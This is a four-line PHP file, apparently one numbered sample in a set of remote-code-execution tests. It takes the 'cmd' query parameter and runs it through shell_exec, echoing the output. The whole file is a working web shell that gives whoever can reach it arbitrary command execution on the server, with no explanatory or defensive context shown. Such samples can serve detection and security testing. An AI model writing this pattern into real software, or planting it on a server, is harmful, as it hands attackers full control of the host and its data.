<?php
// RCE test variation #1196
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>